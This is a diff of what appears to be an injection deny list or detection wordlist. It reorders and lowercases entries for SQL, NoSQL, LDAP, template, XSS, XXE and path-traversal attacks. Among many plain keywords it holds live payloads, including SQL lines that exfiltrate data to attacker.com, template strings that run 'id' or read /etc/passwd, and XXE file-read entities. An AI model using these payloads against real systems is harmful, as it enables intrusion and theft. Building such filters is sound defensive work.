@@ -1,988 +1,844 @@
-'
-objectClass=
-cn=
+$and
+flastmod
+{% include "file.txt" %}
+c:\windows\win.ini%00
+batchwriteitem
+{"$where": "sleep(100)"}
+$home
+%>
+/usr
+xp_cmdshell
+{{config}}
+whoami
+unhex()
+'; select pg_sleep(5) --
+{"$function": "function() { return true; }"}
+@/../../
+pg_sleep()
+'; declare @q varchar(1024); set @q = '\\attacker.com\' + (select @@version); exec master..xp_dirtree @q; --
+response
+"$ne"
+zip://../
+db.
+delattr
+new function()
+into
+show
+' && this.username!='admin'
+127.0.0.1
+admin
+unixhomedirectory
+onhashchange
+<input>
+' or binary 1=1 --
+document.url
+%windir%\..\
+$jsonschema
+/..;/
+tasklist
+file:///c:/windows/win.ini
+/../
+escape()
+current_user()
+%252e%252e%252f
+<embed>
+${
+<body
+open
 uid=
-userPassword= 
-sn=
-co
-commonName
-dc
-facsimileTelephoneNumber
-givenName
-gn
-homePhone
-jpegPhoto
-objectClass
-ou
-owner
-pager
-surname
-userPassword
-ls
-cat
-chmod
-chown
-cp
-curl
+twig
+description
+codebase
+%00
+limit
+ondrag
+vnc://
+zip:
+like
+super
+{{request.environ}}
+read
+{{['id']|filter('system')}}
+having
+update()
+$mod
+%systemroot%
+<!--#echo
+scan
+natural join
+mobile
+$not
+\x0d
+telephonenumber
+/etc
+'%00'
+'%09'
+mail
+batchgetitem
+findone
+iframe
+classid
+union select username,password from users--
+and
+' or 1=1; --
+or (select 1 from (select sleep(5))a)
+groupmembership
+right join
+ascii()
+{{system('cat /etc/passwd')}}
+sp_executesql
+modifiersname
+onscroll
+%remote;
+group
+between
+"$gt"
+distinct()
+{"$or": [{"admin": true}]}
+' /*!50000select*/ 1 --
+flask
+set
+"$addfields"
+insert
+$ifs
+char(
+sleep()
+'%0aor%0a1=1--
+insert()
+%2e%2e%2f
+getattr
+sp_adduser
+" or ""="
+....%2f
+passwordexpirationtime
+<iframe
+"$in"
+userpassword=
+...\
+<dialog
+alter user
+gopher://
+union select null--
+./
+deleteitem
+\..\
+secretary
+is null
+<template>
+-- -
+decodeuricomponent()
+remove()
+usercertificate
+ftp://
+allow-same-origin
+manager
+decodeuricomponent
+taskkill
+#{
+setinterval
+with
+tar
+substring(
+public
+$group
+union select 1,2,3--
 wget
 find
-grep
-head
-tail
-kill
-ps
-netstat
-ping
-ifconfig
-nc
-netcat
-whoami
-ssh
-scp
-tar
-unzip
-dir
-attrib
-copy
-del
-ipconfig
-ping
-net
-netstat
-tasklist
-taskkill
-shutdown
-regedit
-powershell
-whoami
-sc
-bin
-$PATH
-$HOME
-$SHELL
-$USER
-%SYSTEMROOT%
-%WINDIR%
-%TEMP%
-%USERPROFILE%
-$IFS
-/etc
-\\
-..
-/var
-/proc
-/usr
-C:\
+${7*7}
+{php}echo `id`;{/php}
 "$eq"
-"$ne"
-"$gt"
-"$gte"
-"$lt"
-"$lte"
-"$in"
-"$nin"
-"$regex"
-"$exists"
-"$all"
-"$size"
-"$type"
-"$mod"
-"$match"
-"$project"
-"$lookup"
-"$group"
-"$addFields"
-"$where"
-db.
-find
-findOne
-update
-insert
-delete
-aggregate
-drop
-createUser
-mapReduce
-' or
-sleep(
-benchmark(
-xp_cmdshell
-exec
-sp_executesql
-LOAD_FILE
-INTO
-OUTFILE
-INTO
-DUMPFILE
-SELECT
-UNION(
-ORDER
-BY
-GROUP
-BY
-HAVING
-WHERE
-CAST
-CONVERT
-DATABASE
-CHAR(
-ASCII(
-SUBSTRING(
-INFORMATION_SCHEMA
-TABLES
-COLUMNS
-NULL
-TRUE
-FALSE 
-ALTER
-TABLE
-DROP
-TABLE 
-INSERT
-INTO
-DELETE
-FROM
-UPDATE
-GRANT
-REVOKE
-CREATE
-DATABASE
-CREATE
-TABLE
-SHOW
-TABLES
-DESCRIBE
-SET
-GLOBAL
-SHOW
-VARIABLES
-LOAD
-DUMPFILE
-OUTFILE
-HAVING
-AND 
-OR 
-<!--#echo
-<!--#exec
-<!--#include
-<!--#flastmod
-<!--#fsize
-<!--#config
-<!--#set
-<!--#if
-<!--#elif
-<!--#else
-<!--#endif
-echo
-exec
-include
-flastmod
-fsize
-config
-set
-ftp://
-ftps://
-sftp://
-file://
-gopher://
-dict://
-ldap://
-tftp://
-nfs://
-php://
-smb://
-vnc://
-data://
-jar://
-127.0.0.1
-localhost
-script
-img
-iframe
-object
-embed
-textarea
-<a
-onerror
-onload
-onclick
-onmouseover
-onfocus
-onblur
-onchange
-onkeydown
-onkeyup
-onmousedown
-onmouseup
-eval
-document.write
-document.location
-window.location
+localstorage
+link
+sandbox
+commands
+href
+scp
+__import__
+location.search
+autofocus
+unzip
+ifconfig
 window.onerror
-alert
-confirm
-prompt
-setTimeout
-setInterval
-innerHTML
-outerHTML
-unescape
-encodeURIComponent
-decodeURIComponent
-window.eval
-javascript:
-iframe
-srcdoc
-src
-../
-..\
-./
-.\
-/../
-\..\
-.../
-...\
-////
-\\\\
-%2e%2e%2f
-%2e%2e%5c
-%252e%252e%252f
+document.title
+encodeuricomponent()
+findone()
+--
+/\../
+]>
 ..%c0%af
-..%ef%bc%8f
-..%5c
-%2e%2e/
-%2e%2e\
-..%00/
-..%0a
-..%0d
-C:\..\
-%SYSTEMROOT%\..\
-%WINDIR%\..\
-\\?\C:\..\
-\\.\C:\..\
-..%c1%9c
-..%e0%80%af
-....//
+' and (select sql from sqlite_master) is not null --
+<slot>
+onselect
+tostring
+<style
+conditionexpression
+oauthtoken
+document.writeln
+' or 'a'='a' --
+onload
+innerhtml
+<marquee
+<plaintext
+location.href
 ....\/
-....%2f
-....%5c
+group_concat()
+sys
+<!element foo any >
+hex()
+onwheel
+"$group"
+<xs:import schemalocation="http://
+cast()
+$exists
+' union select null,null --
+employeetype
+gn
+alert
+$size
+$project
+$where
+<details
+seealso
+' or 'x'='x
+<track
+confirm
+fsize
+....//
+name
+or benchmark(10000000,md5(1))
+<%=
+chr(65)||chr(66)
+delete
+ascii(
+img
+{{''.__class__.__mro__[1].__subclasses__()}}
+'; exec master..xp_cmdshell('whoami') --
+$all
+data:text/html
+regedit
+__mro__
+creatorsname
+textarea
+.\
+<form>
+window.location
+jar://
+union select table_name from information_schema.tables--
+" or 1=1/*
+~
+homedirectory
+ord
+$addfields
+\\..\
+document.write
+createuser()
+user()
+session_user()
+onsubmit
+{"$gt": ""}
+userpkcs12
+<!--#fsize
+findandmodify()
+load
+${path}../../
+{{7*7}}
+$regex
+file:///proc/self/environ
+describe
+$path
+mid()
+websocket
+c:\..\
+id
+exec sp_executesql n'select 1'
+$lte
+$expr
+into dumpfile
+{{_self.env}}
+system_user()
+' or 1=1 order by 1 --
+{% debug %}
+document.baseuri
+..//
+$ne
+variables
+createtimestamp
+dc
+%local;
+' || 1==1
+jinja
+onmouseenter
+x500uniqueidentifier
+sftp://
+$path/../../
+memberof
+/var
+onblur
+document.documenturi
+information_schema.schemata
+$in
+ipconfig
+<!--#include
+<menu
+location.hash
+//
+"data://
+../
+encode()
+ssh
+src
+"$size"
+revoke
+displayname
+export
+config
+allow-scripts
+create user
+"$lt"
+execute
+in
+<!--#endif
+"$exists"
+union(
+password()
+'||1=1--
+<script
+<content>
+builtins
+' or cast(1 as bit)=1 --
+onerror
+{system('id')}
+constructor
+<!--#if
+'=0+1--
+allow-top-navigation
+exec
+embed
+xor
+document.body.innerhtml
+information_schema.columns
+substring()
+..\../
+'; return db.getcollectionnames()
+pager
+curl
+jpegphoto
+template
+onkeydown
+thymeleaf
+drop()
+'+'
+union select
+utl_http.request()
+find()
+concat()
+prompt
+\x1a
+load_file()
+{"username": {"$type": "string"}}
+_rewrite
+$bitsallclear
+settings
+distinct
+velocity
+/etc/passwd\0
+__globals__
+echo
+contenteditable
 /./../
-/.\../
+compile()
+request
+<!entity % param1 "<!entity % external system
+tftp://
+onmouseleave
+cross join
+end
+chr
+sessionstorage
+{{_self.env.getfilter('exec')}}
+http://internal.server/
+del
+base
+<!--#exec
+%windir%
+data://text/plain;base64,
+include
+query
+not
+${}
+bulk insert
+all_tables
+data
+getmore()
+..%0d
+<frameset
+dbms_lock.sleep()
+]]
+waitfor delay
+${"7*7"}
+tail
+when
+'%0d'
+valueof
+ascript:alert(1)">
+entryuuid
+sshpublickey
+netcat
+<!doctype
+exists
+{"$ne": null}
+_list
+' or 1=1/*
+member
+<link
+roleoccupant
+__subclasses__
+' rlike (select (case when (1=1) then 1 else 0x28 end)) --
+drop user
+' or 1=1 from dual --
+"expect://
+group by
+bulkwrite()
+; shutdown with nowait--
+onfocus
+onpointerup
+<menuitem
+oncopy
+c=
+xp_regwrite
+' or 1=1#
+..\..\boot.ini\x00
+_show
+$search
+usersmimecertificate
+<svg onload=alert(1)>
+encodeuricomponent
+kill
+{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__=='catch_warnings' %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
+l=
+%temp%
+localhost
+table
+homephone
+if(1=1,sleep(5),0)
+smarty
+subclasses
+pattern
+dir
+convert
+__builtins__
+onmouseover
+givenname
+~~
+sysobjects
+setinterval()
+co
+//../
+document.referrer
+<button
+<audio
+<!doctype foo [
+'/**/'
+or if(1=1,sleep(5),0)
+*)
+<source
+utf-7: +adwaiq-doctype+aca-foo+afs-
+else
+<!doctype foo [ <!entity xxe system
+xmlhttprequest
+using
+$rand
+char()
+entrydn
+' /*!50000or*/ 1=1 --
+mapreduce
+substr()
+`...`
+__bases__
+convert()
+%}
+title
+{"$exists": true}
+<video
+..%ef%bc%8f
+document.cookie
+history.pushstate
+$meta
+'+(select 1)+'
+system
+history.replacestate
+ontoggle
+;
+jar://../
+archive
+$or
+ps
+$nor
+exec()
+object
+then
+))
+netstat
+<svg
+co=
+explain()
+is not null
+join
+<!--#else
+dba_tables
+$text
+style
+systables
+sha1()
+net
+md5()
+chown
+php://
+pg_read_file()
+uidnumber
+accountstatus
+pg_sleep(5)
+poster
+_reduce
+"$all"
+lastlogintime
+<a
+{"$regex": ".*"}
+%userprofile%
+load_file
+session
+/proc
+@@version
+ou
+'||'
+offset
+..%5c
+$bitsanyset
+onmessage
+....%5c
+openrowset
+roomnumber
+<%= system('id') %>
+{{os.popen('id').read()}}
+objectclass=
+\x0a
+ord()
+<img src="jav&#x0a;ascript:alert(1)">
+onmousedown
+encodeuri()
+..%e0%80%af
+o=
+_update
+popen
+<scr<script>ipt>
+"$where"
+..%0a
+decode()
+union select column_name from information_schema.columns--
+srcdoc
+function()
+" or 1=1 --
+onbeforeunload
+{% load module %}
+database()
+" or 1=1#
+'%0a'
+loginshell
+proxy
+information_schema
+onpopstate
+version()
+$bitsallset
+onpointerdown
+<!--#elif
+"http://
+' or 1=1 into outfile '/tmp/test.txt' --
+unescape()
+<!entity % payload system "file:///etc/passwd">
+body
+or (select substring(table_name,1,1) from information_schema.tables limit 1)='a'
+surname
+drop
+..%c1%9c
+@@hostname
+window.eval
+$match
+and 1=convert(int, @@version)
+json.parse
+alter
+' or ''='
+<!entity % int "<!entity % exfil system
+'%20'
+database
+union
+nfs://
+[[
+smb://
+onmouseup
+ejs
+'
+expect://id
+$$
+formaction
+or
+"$regex"
+settimeout()
+$bitsanyclear
+global
+prototype
+entity
+createuser
+onkeyup
+shadowlastchange
+and 1=1
+and 1=2
+dict
+"$gte"
+$user
+dumpfile
+cast
+and 1=cast((select table_name from information_schema.tables) as int)
+allow-forms
+file
+load data infile
+cn=
+tojson
+benchmark()
+<img src="jav	ascript:alert(1)">
+file:///etc/passwd
+$lt
+\\\\
+$gt
+"$lookup"
+ping
+%
+' div 1 --
+sqlite_master
+import
+#{7*7}
+<base
+%systemroot%\..\
+<img src="jav&#x09;ascript:alert(1)">
+' xor 1=1 --
+pug
+<!--#set
+((
+postaladdress
+ftps://
+_map
+process
+dict://
+st=
+this
+ls
+class
+vbscript:
+update
+$nin
+null
+$eq
+filterexpression
+putitem
+usemap
+commonname
+<shadow>
+<select
+on
+"ftp://
+data://
+\/\/
+"$lte"
+onmousewheel
+ondrop
+phar://../
+subprocess
+union all select
+globals
+<xmp
+grep
+html entities: &lt;!entity &gt;
+'; exec xp_cmdshell('dir')--
+data:text/javascript
+insertadjacenthtml
+labeleduri
+'/**/or/**/1=1--
+}}
+<java:java.lang.runtime>
+onpaste
+document.location
+/* */
+outfile
+<java:java.io.file>
+..\\
+$gte
+like '...' escape '...'
+{{self.__dict__}}
+regexp
+"$type"
+getitem
+onpageshow
+{%
+document.domain
+full join
+<html
+information_schema.tables
+decodeuri()
+"file://
+top
+c:\
+preferredlanguage
+projectionexpression
+<img
+settimeout
 \.\./
 /.././
-//../
-\\..\
-\/\/
-/\../
-/..;/
-..\../
-..//
-..\\
-~
-$PATH/../../
-${PATH}../../
-@/../../
-#/../../
-zip://../
-phar://../
-jar://../
-file:///etc/passwd
-\\UNC\share\..\..\
-../../etc/passwd%00
-..\..\boot.ini\x00
-/etc/passwd\0
-C:\Windows\win.ini%00
-objectClass=
-*)
-cn=
-uid=
-userPassword=
-sn=
-c=
-co=
-commonName
-dc
-facsimileTelephoneNumber
-givenName
-gn
-homePhone
-jpegPhoto
-l=
-o=
-objectClass
-ou
-owner
-pager
-st=
-surname
-userPassword
-accountStatus
-admin
-authPassword
-createTimestamp
-creatorsName
-description
-displayName
-employeeNumber
-employeeType
-entryDN
-entryUUID
-groupMembership
-homeDirectory
-labeledURI
-lastLoginTime
-loginShell
-manager
-member
-memberOf
-modifiersName
-modifyTimestamp
-oAuthToken
-passwordExpirationTime
-personalTitle
-photo
-postalAddress
-preferredLanguage
-roleOccupant
-roomNumber
-secretary
-seeAlso
-shadowLastChange
-sshPublicKey
-telephoneNumber
-title
-uidNumber
-unixHomeDirectory
-userCertificate
-userPKCS12
-userSMIMECertificate
-x500UniqueIdentifier
-$eq
-$ne
-$gt
-$gte
-$lt
-$lte
-$in
-$nin
-$regex
-$exists
-$all
-$size
-$type
-$mod
-$match
-$project
-$lookup
-$group
-$addFields
-$where
-$text
-$search
-$meta
-$elemMatch
-$not
-$or
-$and
-$nor
-$expr
-$jsonSchema
-$rand
-$slice
-$bitsAllClear
-$bitsAllSet
-$bitsAnyClear
-$bitsAnySet
-db.
-find()
-findOne()
-update()
-insert()
-delete()
-remove()
-aggregate()
-drop()
-createUser()
-mapReduce()
-count()
-distinct()
-explain()
-bulkWrite()
-findAndModify()
-getMore()
-killCursors()
-eval()
-$function
-this
-self
-constructor
-prototype
-toString
-valueOf
-toJSON
-setTimeout()
-setInterval()
-Function()
-new Function()
-exec()
-compile()
-unescape()
-escape()
-decodeURI()
-encodeURI()
-decodeURIComponent()
-encodeURIComponent()
-{"$where": "true"}
-{"$ne": null}
-{"$gt": ""}
-{"$exists": true}
-{"$regex": ".*"}
-{"$or": [{"admin": true}]}
-{"username": {"$type": "string"}}
-{"$where": "sleep(100)"}
-{"$where": "this.isAdmin == true"}
-{"$function": "function() { return true; }"}
-\x00
-\x1a
-\u0000
-%00
-/* */
-//
-`
-${}
-Query
-Scan
-PutItem
-GetItem
-UpdateItem
-DeleteItem
-BatchGetItem
-BatchWriteItem
-ConditionExpression
-FilterExpression
-ProjectionExpression
-_map
-_reduce
-_update
-_show
-_list
-_filter
-_rewrite
-SELECT
-UNION
-UNION ALL
-ORDER BY
-GROUP BY
-HAVING
-WHERE
-BETWEEN
-EXISTS
-NOT
-AND
-OR
-XOR
-IS NULL
-IS NOT NULL
-DISTINCT
-LIMIT
-OFFSET
-TOP
-AS
-CASE
-WHEN
-THEN
-ELSE
-END
-JOIN
-INNER JOIN
-LEFT JOIN
-RIGHT JOIN
-FULL JOIN
-CROSS JOIN
-NATURAL JOIN
-ON
-USING
-WITH
-RECURSIVE
-SLEEP()
-BENCHMARK()
-WAITFOR DELAY
-PG_SLEEP()
-DBMS_LOCK.SLEEP()
-XP_CMDSHELL
-EXEC
-EXECUTE
-SP_EXECUTESQL
-EVAL()
-LOAD_FILE()
-INTO OUTFILE
-INTO DUMPFILE
-DUMPFILE
-CHAR()
-ASCII()
-ORD()
-SUBSTRING()
-SUBSTR()
-MID()
-CONCAT()
-GROUP_CONCAT()
-HEX()
-UNHEX()
-CAST()
-CONVERT()
-ENCODE()
-DECODE()
-MD5()
-SHA1()
-PASSWORD()
-VERSION()
-DATABASE()
-USER()
-CURRENT_USER()
-SESSION_USER()
-SYSTEM_USER()
-@@VERSION
-@@HOSTNAME
-/*!50000 ... */
-`...`
--- -
---
-;
-$$
-pg_sleep()
-pg_read_file()
-WAITFOR DELAY '0:0:5'
-OPENROWSET
-BULK INSERT
-sp_adduser
-xp_regwrite
-UTL_HTTP.REQUEST()
-UTL_FILE.FOPEN()
-LIKE '...' ESCAPE '...'
-' OR 1=1 --
-' OR '1'='1
-' UNION SELECT null,null --
-' /*!50000SELECT*/ 1 --
-'%00'
-'%0A'
-'%0D'
-'%09'
-'%20'
-'/**/'
-'||'
-'+'
-CHR(65)||CHR(66)
-INFORMATION_SCHEMA.TABLES
-INFORMATION_SCHEMA.COLUMNS
-INFORMATION_SCHEMA.SCHEMATA
-ALL_TABLES
-DBA_TABLES
-SYSOBJECTS
-SYSTABLES
-sqlite_master
-GRANT
-REVOKE
-CREATE USER
-DROP USER
-ALTER USER
-FILE
-PROCESS
-SUPER
-SHUTDOWN
-LOAD DATA INFILE
-OUTFILE
-" OR ""="
-' OR ''='
-' OR 'x'='x
-' OR 'a'='a' --
-' OR 1=1; --
-' OR '1'='1' --
-' OR 1=1#
-' OR 1=1/*
-" OR 1=1 --
-" OR 1=1#
-" OR 1=1/*
-UNION SELECT
-UNION ALL SELECT
-UNION SELECT NULL--
-UNION SELECT 1,2,3--
-UNION SELECT table_name FROM information_schema.tables--
-UNION SELECT column_name FROM information_schema.columns--
-UNION SELECT username,password FROM users--
-AND 1=CONVERT(int, @@version)
-AND 1=CAST((SELECT table_name FROM information_schema.tables) AS int)
-EXEC sp_executesql N'SELECT 1'
-OR (SELECT 1 FROM (SELECT SLEEP(5))a)
-AND 1=1
-AND 1=2
-OR IF(1=1,SLEEP(5),0)
-OR (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'
-IF(1=1,SLEEP(5),0)
-OR BENCHMARK(10000000,MD5(1))
-PG_SLEEP(5)
-; DROP TABLE users--
-; SHUTDOWN WITH NOWAIT--
-'; EXEC xp_cmdshell('dir')--
-'; DECLARE @q VARCHAR(1024); SET @q = '\\attacker.com\' + (SELECT @@version); EXEC master..xp_dirtree @q; --
-'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test')) --
-'/**/OR/**/1=1--
-'%0AOR%0A1=1--
-'||1=1--
-'+(SELECT 1)+'
-'=0+1--
-' XOR 1=1 --
-' DIV 1 --
-' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) --
-' OR BINARY 1=1 --
-' /*!50000OR*/ 1=1 --
-' OR 1=1 INTO OUTFILE '/tmp/test.txt' --
-'; EXEC master..xp_cmdshell('whoami') --
-' OR IS_SRVROLEMEMBER('sysadmin')=1 --
-' OR CAST(1 AS bit)=1 --
-'; SELECT pg_sleep(5) --
-' OR 1=1 FROM dual --
-' OR 1=1 ORDER BY 1 --
-' AND (SELECT sql FROM sqlite_master) IS NOT NULL --
-' || 1==1
-'; return db.getCollectionNames()
-' && this.username!='admin'
-<!--#echo
-<!--#exec
-<!--#include
-<!--#flastmod
-<!--#fsize
-<!--#config
-<!--#set
-<!--#if
-<!--#elif
-<!--#else
-<!--#endif
-echo
-exec
-include
-flastmod
-fsize
-config
-set
-ftp://
-ftps://
-sftp://
-file://
-gopher://
-dict://
-ldap://
-tftp://
-nfs://
-php://
-smb://
-vnc://
-data://
-jar://
-127.0.0.1
-localhost
-{{  
-}}  
-{%  
-%}  
-#{ 
-${
-<%=  
-%>  
-[[  
-]]  
-((  
-))  
-~~  
-self  
-template  
-env  
-config  
-settings  
-request  
-response  
-session  
-globals  
-locals  
-vars  
-dir  
-dict  
-class  
-subclasses  
-mro  
-base  
-builtins  
-import  
-eval  
-exec  
-compile  
-open  
-read  
-write  
-file  
-os  
-sys  
-commands  
-subprocess  
-popen  
-system  
-chr  
-ord  
-getattr  
-setattr  
-delattr  
-__class__  
-__init__  
-__globals__  
-__builtins__  
-__import__  
-__subclasses__  
-__mro__  
-__base__  
-__bases__  
-{{7*7}}  
-{{config}}  
-{{request.environ}}  
-{{self.__dict__}}  
-{{''.__class__.__mro__[1].__subclasses__()}}  
-{{_self.env}}  
-{{_self.env.getFilter('exec')}}  
-{{['id']|filter('system')}}  
-{% debug %}  
-{% include "file.txt" %}  
-{% load module %}  
-<%= 7*7 %>  
-<%= Dir.entries('/') %>  
-<%= system('id') %>  
-<%- 7*7 %>  
-#{7*7}  
-${7*7}  
-{system('id')}  
-{php}echo `id`;{/php}  
-\x00
-\x0a
-\x0d
-\u0000
-${"7*7"}
-#{7*7}
-{{'7'*'7'}}
-{{os.popen('id').read()}}  
-{{system('cat /etc/passwd')}}  
-{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__=='catch_warnings' %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
-flask  
-django  
-jinja  
-twig  
-smarty  
-handlebars  
-ejs  
-pug  
-velocity  
-freemarker  
-thymeleaf
-<script
-<img
-<iframe
-<object
-<embed>
-<form>
-<input>
-<textarea
-<a
-<body
-<html
-<head
-<link
-<style
-<svg
-<video
-<audio
-<source
-<track
-<frame
-<frameset
-<marquee
-<meta
-<base
-<button
-<select
-<option
-<details
-<dialog
-<menu
-<menuitem
-<template
-<xmp
-<plaintext
-onerror
-onload
-onclick
-onmouseover
-onfocus
-onblur
-onchange
-onkeydown
-onkeyup
-onmousedown
-onmouseup
-onmouseenter
-onmouseleave
-onmousewheel
-onpointerdown
-onpointerup
-onreset
-onsubmit
-onselect
-oncut
-oncopy
-onpaste
-ondrag
-ondrop
-onscroll
-onwheel
-onhashchange
-onmessage
-onstorage
-onunload
-onbeforeunload
 onpagehide
-onpageshow
-onpopstate
-onresize
-onstorage
-ontoggle
-eval
-document.write
-document.writeln
-document.location
-window.location
-window.onerror
-alert
-confirm
-prompt
-setTimeout
-setInterval
-innerHTML
-outerHTML
-insertAdjacentHTML
-document.cookie
-localStorage
-sessionStorage
-XMLHttpRequest
-fetch
-WebSocket
-import
-export
-Function
-constructor
-prototype
-toString
-valueOf
-unescape
-escape
-encodeURI
-encodeURIComponent
-decodeURI
-decodeURIComponent
-atob
-btoa
-JSON.parse
-JSON.stringify
-RegExp
-Proxy
-Reflect
-src
-href
-action
-formaction
-poster
-background
-data
-dynsrc
-lowsrc
-codebase
-archive
-classid
-usemap
-srcdoc
-sandbox
-allow-scripts
-allow-forms
-allow-same-origin
-allow-top-navigation
-contenteditable
-autofocus
-pattern
-style
-javascript:
-data:text/html
-data:text/javascript
-vbscript:
-about:
-<scr<script>ipt>
-<IMG SRC="jav&#x09;ascript:alert(1)">
-<IMG SRC="jav	ascript:alert(1)">
-<IMG SRC="jav
-ascript:alert(1)">
-<IMG SRC="jav&#x0A;ascript:alert(1)">
-<IMG SRC="jav&#x0D;ascript:alert(1)">
-<IMG SRC="jav&#x00;ascript:alert(1)">
-<svg onload=alert(1)>
-document.domain
-document.referrer
-document.URL
-document.documentURI
-document.baseURI
-document.cookie
-document.title
-document.body.innerHTML
-document.forms[0].action
-window.name
-location.href
-location.hash
-location.search
-history.pushState
-history.replaceState
-<template>
-<slot>
-<shadow>
-<content>
-<!DOCTYPE 
-<!ENTITY 
-%  
-SYSTEM 
-"file://
-"http://
-"ftp://
+select
+handlebars
+sn=
+{"$where": "true"}
+"$nin"
+cdata wrapping: <![cdata[ <!entity xxe system "file:///etc/passwd"> ]]>
+<%- 7*7 %>
+"$project"
+\\?\c:\..\
+' or '1'='1
 "php://
-"expect://
-"data://
-ENTITY
-PUBLIC
-]>
-file:///etc/passwd
-file:///c:/windows/win.ini
-file:///proc/self/environ
-http://internal.server/
+ldap://
+$slice
+__base__
+<%= 7*7 %>
+<option
+count()
+nc
+$type
+userpassword
+btoa
+<img src="jav&#x0d;ascript:alert(1)">
+as
+dynsrc
+<!entity % ext system
+javascript:
+atob
+<meta
+"$match"
+__init__
+into outfile
+onresize
+onclick
+////
+aggregate()
+' or 1=1 --
+onunload
+function
+recursive
+onstorage
+reflect
+action
+benchmark(
+#/../../
+<!--#flastmod
+%2e%2e/
+eval()
+modifytimestamp
+..%00/
+case
+<head
+..\
+\x00
+window.name
+$shell
+__class__
 php://filter/convert.base64-encode/resource=
-expect://id
-data://text/plain;base64,
+_filter
+<!--#config
+grant
+mapreduce()
+' or '1'='1' --
 jar:
-zip:
-<!ENTITY % ext SYSTEM 
-<!ENTITY % int "<!ENTITY % exfil SYSTEM
-%local;
-%remote;
-<!ENTITY % payload SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY % external SYSTEM
-<!DOCTYPE foo [  
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-]>
+facsimiletelephonenumber
+<textarea
+encodeuri
+sleep(
+"$mod"
+vars
+personaltitle
+order
+utl_file.fopen()
+json.stringify
+$function
+django
+owner
+left join
+head
+compile
+sc
+inner join
+eval
+%2e%2e%5c
+\u0000
+<!entity
+.../
+waitfor delay '0:0:5'
+cat
+; drop table users--
+where
+script
+decodeuri
+\\unc\share\..\..\
+<!entity % xxe system "file:///etc/passwd" >
+file://
+setattr
+document.forms[0].action
+powershell
+<frame
+$elemmatch
+aggregate
+freemarker
+$lookup
+\\.\c:\..\
+{"$where": "this.isadmin == true"}
+objectclass
+background
+<%= dir.entries('/') %>
+outerhtml
+`
+create
+escape
+' or
+delete()
+{{'7'*'7'}}
+union all
+{{
+onreset
+/*!50000 ... */
+' or is_srvrolemember('sysadmin')=1 --
+authpassword
+'; select load_file(concat('\\\\',(select @@version),'.attacker.com\\test')) --
+env
+../../etc/passwd%00
+lowsrc
+about:
+<object
+photo
+write
+onchange
+%2e%2e\
+<template
+<img src="jav
+bin
+unescape
+order by
+killcursors()
+updateitem
+self
+locals
+employeenumber
+tables
+<img src="jav&#x00;ascript:alert(1)">
+/.\../
+chmod
+shutdown
 <xi:include href="file:///etc/passwd" parse="text"/>
-UTF-7: +ADwAIQ-DOCTYPE+ACA-foo+AFs-
-HTML Entities: &lt;!ENTITY &gt;
-CDATA Wrapping: <![CDATA[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]]>
-<java:java.io.File>
-<java:java.lang.Runtime>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
-<xs:import schemaLocation="http://
+columns
+oncut
